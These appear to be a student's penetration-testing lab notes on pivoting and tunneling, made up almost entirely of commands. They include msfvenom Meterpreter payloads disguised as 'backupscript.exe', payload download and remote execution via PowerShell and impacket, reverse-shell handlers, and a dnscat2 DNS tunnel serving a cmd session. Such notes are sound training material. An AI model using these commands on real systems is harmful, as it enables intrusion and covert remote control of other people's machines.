### Routing Table Enumeration

#### Linux
```Shell
ifconfig
```

```Shell
netstat -r
```

#### Windows
```cmd.exe
ipconfig
```

## Dynamic Port Forwarding with SSH and SOCKS Tunneling

![[Pasted image 20230309114357.png]]

#### Scanning the Pivot Target
```Shell
nmap -sT -p22,3306 10.129.202.64
```

#### Executing the Local Port Forward
```Shell
ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64
```

#### Confirming Port Forward with Netstat
```Shell
netstat -antp | grep 1234
```

#### Confirming Port Forward with Nmap
```Shell
nmap -v -sV -p1234 localhost
```

#### To forward multiple ports from the Ubuntu server to your localhost, include the local` port:server:port` argument in your ssh command
```Shell
ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64
```
Forwards the Apache web server's port `80` to your attack host's local port on `8080`

### Setting up to Pivot

#### Looking for Opportunities to Pivot using ifconfig
```Shell
ifconfig
```

#### Enabling Dynamic Port Forwarding with SSH
```Shell
ssh -D 9050 ubuntu@10.129.202.64
```

#### Checking /etc/proxychains.conf
```Shell
tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```

#### Using Nmap with Proxychains
```Shell
proxychains nmap -v -sn 172.16.5.1-200
```

#### Enumerating the Windows Target through Proxychains
```Shell
proxychains nmap -v -Pn -sT 172.16.5.19
```

### Using Metasploit with Proxychains

#### Open Metasploit using proxychains
```Shell
proxychains msfconsole
```

#### MSF - Using rdp_scanner Module
```Shell
search rdp_scanner
```

```Shell
use auxiliary/scanner/rdp/rdp_scanner
```

#### Using xfreerdp with Proxychains
```Shell
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```


## Remote/Reverse Port Forwarding with SSH

![[Pasted image 20230309120552.png]]

#### Creating a Windows Payload with msfvenom
```Shell
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

#### MSF - Configuring & Starting the multi/handler
```Shell
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
```

#### Transferring Payload to Pivot Host
```Shell
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

#### Starting Python3 Webserver on Pivot Host
```Shell
python3 -m http.server 8123
```

#### Downloading Payload from Windows Target
```PowerShell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

#### Using SSH -R
```Shell
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

#### Viewing the Logs from the Pivot
#### Meterpreter Session Established
![[Pasted image 20230309120923.png]]


## Meterpreter Tunneling & Port Forwarding

#### Creating Payload for Ubuntu Pivot Host
```Shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

#### MSF - Configuring & Starting the multi/handler
```Shell
use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp
run
```

#### Copy the backupjob binary file to the Ubuntu pivot host over SSH and execute it to gain a Meterpreter session
```Shell
chmod +wrx backupjob
```

```Shell
./backupjob
```

#### Meterpreter Session Established

#### Meterpreter Ping Sweep
```Shell
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

#### Ping Sweep For Loop on Linux Pivot Hosts
```Shell
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

#### Ping Sweep For Loop Using CMD
```cmd.exe
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

#### Ping Sweep For Loop Using PowerShell
```PowerShell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

*Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build it's arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built. *

#### MSF - Configuring MSF's SOCKS Proxy
```Shell
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
```

#### MSF - Confirming Proxy Server is Running
```Shell
jobs
```

#### Adding a line to proxychains.conf if needed
```Shell
socks4    127.0.0.1 9050
```

*Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf. *

#### MSF - Creating Routes with AutoRoute
```Shell
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run
```
`OR from Meterpreter`:
```Shell
run autoroute -s 172.16.5.0/23
```

#### Meterpreter - Listing Active Routes with AutoRoute
```Shell
run autoroute -p
```

#### Testing Proxy & Routing Functionality
```Shell
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

### Port Forwarding

#### Meterpreter - Portfwd options
```Shell
help portfwd
```

#### Meterpreter - Creating Local TCP Relay
```Shell
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

#### Connecting to Windows Target through localhost
```Shell
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

#### Using Netstat output to view information about the established session
```Shell
netstat -antp
```

### Meterpreter Reverse Port Forwarding

Used when you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host

#### Meterpreter - Reverse Port Forwarding Rules
```Shell
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

#### Meterpreter/MSF - Configuring & Starting multi/handler
```Shell
bg
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 8081 
set LHOST 0.0.0.0
run
```

#### Generating the Windows Payload
```Shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

#### Upload and execute the payload on the Windows host to establish the Meterpreter Session


## Socat Redirection with a Reverse Shell

#### Starting Socat Listener on Pivot Host
```Shell
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

#### Creating the Windows Payload
```Shell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

#### MSF - Configuring & Starting the multi/handler
```Shell
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run
```

#### Run the payload on the Windows host to establish meterpreter session


## Socat Redirection with a Bind Shell

![[Pasted image 20230309123153.png]]

#### Creating the Windows Payload
```Shell
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```

#### Starting Socat Bind Shell Listener on Pivot Host
```Shell
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

#### MSF - Configuring & Starting the Bind multi/handler
```Shell
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64
set LPORT 8080
run
```

#### Execute payload on Windows host to establish Meterpreter Session


## SSH for Windows: plink.exe

![[Pasted image 20230309123433.png]]

#### Using Plink.exe
```cmd.exe
plink -D 9050 ubuntu@10.129.15.50
```

#### Using Proxifier
![[Pasted image 20230309123510.png]]

#### After configuring the SOCKS server for `127.0.0.1` and port `9050`, we can directly start `mstsc.exe` to start an RDP session with a Windows target that allows RDP connections


## SSH Pivoting with Sshuttle

#### Installing sshuttle
```Shell
apt-get install sshuttle
```

#### Running sshuttle
```Shell
sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
```

#### Traffic Routing through iptables Routes
```Shell
nmap -v -sV -p3389 172.16.5.19 -A -Pn
```

***We can now use any tool directly without using proxychains***


## Web Server Pivoting with Rpivot

![[Pasted image 20230309124443.png]]

#### Cloning rpivot
```Shell
git clone https://github.com/klsecservices/rpivot.git
```

#### Installing Python2.7
```Shell
apt-get install python2.7
```

#### Running server.py from the Attack Host
```Shell
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

#### Transferring rpivot to the Target
```Shell
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

#### Running client.py from Pivot Target
```Shell
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

#### Browsing to the Target Webserver using Proxychains
```Shell
proxychains firefox-esr 172.16.5.135:80
```

#### Connecting to a Web Server using HTTP-Proxy & NTLM Auth
```Shell
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```
Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password.


## Port Forwarding with Windows Netsh

Good tool to use if you want to live off the land and/or can't upload any scripts

![[Pasted image 20230309125028.png]]

#### Using Netsh.exe to Port Forward
```cmd.exe
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```

#### Verifying Port Forward
```cmd.exe
netsh.exe interface portproxy show v4tov4
```

#### Connecting to the Internal Host through the Port Forward
```Shell
xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123
```


## DNS Tunneling with Dnscat2

#### Cloning dnscat2 and Setting Up the Server
```Shell
git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
gem install bundler
bundle install
```

#### Starting the dnscat2 server
```Shell
ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

*After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server.*

#### Cloning dnscat2-powershell to the Attack Host
```Shell
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

#### Importing dnscat2.ps1
```PowerShell
Import-Module .\dnscat2.ps1
```

#### Using dnscat2.ps1 to establish a tunnel with the server running on our attack host
```PowerShell
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```
This will send a command session to our server running on ruby

#### Confirming Session Establishment
```dnscat
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>
```

#### Listing dnscat2 Options
```dnscat
?
```

#### Interacting with the Established Session
```dnscat
window -i 1
```


## SOCKS5 Tunneling with Chisel

### Setting Up & Using Chisel

#### Cloning Chisel
```Shell
git clone https://github.com/jpillora/chisel.git
```

#### Building the Chisel Binary
```Shell
cd chisel
go build
```

#### Transferring Chisel Binary to Pivot Host
```Shell
scp chisel ubuntu@10.129.202.64:~/
```

#### Running the Chisel Server on the Pivot Host
```Shell
./chisel server -v -p 1234 --socks5
```
The Chisel listener will listen for incoming connections on port `1234` using SOCKS5 (`--socks5`) and forward it to all the networks that are accessible from the pivot host

#### Connecting to the Chisel Server
```Shell
./chisel client -v 10.129.202.64:1234 socks
```

#### Editing & Confirming proxychains.conf to add port 1080
```Shell
tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

#### Pivoting to the DC
```Shell
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

### Chisel Reverse Pivot

#### Starting the Chisel Server on our Attack Host
```Shell
chisel server --reverse -v -p 1234 --socks5
```

#### Connect from the Ubuntu (pivot host) to our attack host, using the option `R:socks`
```Shell
./chisel client -v 10.10.14.17:1234 R:socks
```

#### Editing & Confirming proxychains.conf
```Shell
tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

#### Use proxychains and xfreerdp to connect to the DC on the internal network through the tunnel we have created to the Pivot host
```Shell
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```


## ICMP Tunneling with SOCKS

### Setting Up & Using ptunnel-ng

#### Installing Ptunnel-ng
```Shell
apt install ptunnel-ng
```

#### Transferring Ptunnel-ng to the Pivot Host
```Shell
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

#### Starting the ptunnel-ng Server on the Target Host
```Shell
sudo ./ptunnel-ng -r10.129.202.64 -R22
```
The IP address following `-r` should be the IP we want ptunnel-ng to accept connections on

#### Connecting to ptunnel-ng Server from Attack Host
```Shell
ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

#### Tunneling an SSH connection through an ICMP Tunnel
```Shell
ssh -p2222 -lubuntu 127.0.0.1
```
On the client & server side of the connection, we will notice ptunnel-ng gives us session logs and traffic statistics associated with the traffic that passes through the ICMP tunnel. This is one way we can confirm that our traffic is passing from client to server utilizing ICMP.

#### Enabling Dynamic Port Forwarding over SSH
```Shell
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```
We may also use this tunnel and SSH to perform dynamic port forwarding to allow us to use proxychains in various ways.

#### Proxychaining through the ICMP Tunnel
```Shell
proxychains nmap -sV -sT 172.16.5.19 -p3389
```


## Double Pivoting using RDP and SOCKS Tunneling with SocksOverRDP

- Download SocksOverRDP from https://github.com/nccgroup/SocksOverRDP/releases
- Download ProxifierPE.zip from https://www.proxifier.com/download/#win-tab

#### Loading SocksOverRDP.dll using regsvr32.exe
```Shell
regsvr32.exe SocksOverRDP-Plugin.dll
```

#### Connect to 172.16.5.19 over RDP using mstsc.exe
![[Pasted image 20230309152039.png]]
We should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on `127.0.0.1:1080`

#### Transfer `SocksOverRDPx64.zip` or just the `SocksOverRDP-Server.exe` to `172.16.5.19`. 
![[Pasted image 20230309152157.png]]
We can then start `SocksOverRDP-Server.exe` with Admin privileges

#### Confirming the SOCKS Listener is Started
```cmd.exe
netstat -antb | findstr 1080
```

#### Configuring Proxifier
![[Pasted image 20230309152308.png]]
Configure it to forward all our packets to `127.0.0.1:1080`

#### Start mstsc.exe
![[Pasted image 20230309152347.png]]
This will use Proxifier to pivot all our traffic via `127.0.0.1:1080`, which will tunnel it over RDP to `172.16.5.19`, which will then route it to `172.16.6.155` using `SocksOverRDP-server.exe`.

#### RDP Performance Considerations
When interacting with our RDP sessions on an engagement, we may find ourselves contending with slow performance in a given session, especially if we are managing multiple RDP sessions simultaneously. If this is the case, we can access the `Experience` tab in mstsc.exe and set `Performance` to `Modem`.
### Cobalt Strike Pivots
#### Set up Pivot Redirector
```Shell
ssh -R 10.129.238.208:443:10.10.15.211:443 ubuntu@10.129.238.208
```
#### Run socat on redirector
```Shell
sudo socat -v tcp4-listen:443,reuseaddr,fork TCP4:10.10.15.211:443
```
#### Set up Cobalt Strike to have a team server IP of 10.10.15.211
#### Create an HTTP listener
- host will be 172.16.5.129 (ubuntu ip)
- beacon will be 172.16.5.129 (beacon ip)
#### Create payload
- Listener associated with 172.16.5.129
- Output: Windows EXE
- Exit Function: Process
- System Call: none
- Use x64 payload
- Save to Desktop of Kali
#### Create Dynamic Port Forward on pivot host with this command on Kali
```Shell
ssh -D 1080 
```
#### Connect to host over SMB Client from location where you have the payload saved
```Shell
proxychains impacket-smbclient victor:"pass@123"@172.16.5.19
```
#### Go to C$ share
```Shell
use C$
```
#### Go to `C:\Windows\System32`
```Shell
cd C:\Windows\System32
```
#### Upload payload
```Shell
put vsswmi.exe
```
#### Execute the payload
```Shell
proxychains impacket-wmiexec victor:"pass@123"@172.16.5.19 "start C:\Windows\System32\vsswmi.exe"
```

## SSH Command Mode
#### Add `EnableEscapeCommandLine yes` to `/etc/ssh/ssh_config` file
#### Base Commands:
- Escape character: ~
- Enter command mode: ~C
- Emergency Exit: ~.
- List forwarded connections: ~#
- Suspend SSH session (bg): ~Z
- Help menu: ~?
